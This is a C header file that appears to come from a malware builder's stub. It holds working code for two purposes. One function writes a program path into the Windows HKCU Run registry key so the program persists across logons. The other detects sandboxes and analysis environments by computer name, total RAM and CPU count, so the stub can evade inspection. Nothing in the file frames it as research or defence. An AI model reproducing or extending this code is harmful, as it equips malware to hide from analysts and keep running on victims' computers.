/* builder/stub/persist.h */
#ifndef PERSIST_H
#define PERSIST_H
#include <windows.h>
#include <string.h>
#include <stdio.h>

static int install_runkey(const char *name, const char *path) {
    HKEY hk;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hk) != ERROR_SUCCESS) return -1;
    LONG r = RegSetValueExA(hk, name, 0, REG_SZ,
        (const BYTE*)path, (DWORD)strlen(path) + 1);
    RegCloseKey(hk);
    return r == ERROR_SUCCESS ? 0 : -1;
}

static int sandbox_check(void) {
    char name[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD sz = sizeof(name);
    GetComputerNameA(name, &sz);
    const char *bad[] = {"SANDBOX","MALWARE","VIRUS","CUCKOO","ANALYSIS","WINE"};
    for (int i = 0; i < 6; i++) if (strstr(name, bad[i])) return 1;

    MEMORYSTATUSEX ms = { .dwLength = sizeof(ms) };
    GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < (2ULL*1024*1024*1024)) return 1;

    SYSTEM_INFO si; GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return 1;
    return 0;
}
#endif
